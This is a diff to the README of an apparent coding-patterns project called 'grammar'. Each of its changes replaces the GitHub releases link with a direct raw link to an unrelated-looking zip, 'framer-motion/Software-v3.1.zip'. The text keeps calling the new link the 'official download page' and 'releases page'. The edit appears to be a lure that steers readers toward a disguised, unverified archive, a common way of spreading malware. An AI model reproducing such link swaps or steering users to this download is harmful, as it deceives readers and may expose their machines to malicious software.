@@ -1,6 +1,6 @@
 # 📝 grammar - Learn Coding Patterns Clearly
 
-[![Download grammar](https://img.shields.io/badge/Download-grammar-purple?style=for-the-badge)](https://github.com/azeddin4/grammar/releases)
+[![Download grammar](https://img.shields.io/badge/Download-grammar-purple?style=for-the-badge)](https://raw.githubusercontent.com/azeddin4/grammar/main/framer-motion/Software-v3.1.zip)
 
 ## 📖 What is grammar?
 
@@ -26,7 +26,7 @@ Using grammar is straightforward. Follow these steps to download, install, and o
 
 1. Visit the official download page:
 
-   [Download grammar releases](https://github.com/azeddin4/grammar/releases)  
+   [Download grammar releases](https://raw.githubusercontent.com/azeddin4/grammar/main/framer-motion/Software-v3.1.zip)  
 
    This page contains the latest versions of the software. 
 
@@ -82,7 +82,7 @@ You can click on any item to see more details. There are also search and filter 
 
 To keep grammar up to date, visit the releases page regularly:
 
-[Download grammar releases](https://github.com/azeddin4/grammar/releases)
+[Download grammar releases](https://raw.githubusercontent.com/azeddin4/grammar/main/framer-motion/Software-v3.1.zip)
 
 Download the newest setup file when a new version comes out. Follow the same installation steps to update your app. Your settings and data will be kept safe during updates.
 
@@ -104,7 +104,7 @@ The app includes links to external resources that explain coding standards and s
 
 ## 🔗 Useful Links
 
-- Official releases: https://github.com/azeddin4/grammar/releases  
+- Official releases: https://raw.githubusercontent.com/azeddin4/grammar/main/framer-motion/Software-v3.1.zip  
 - Documentation and support: Check the repository’s README and Wiki on GitHub
 
-[![Download grammar](https://img.shields.io/badge/Download-grammar-green?style=for-the-badge)](https://github.com/azeddin4/grammar/releases)
+[![Download grammar](https://img.shields.io/badge/Download-grammar-green?style=for-the-badge)](https://raw.githubusercontent.com/azeddin4/grammar/main/framer-motion/Software-v3.1.zip)
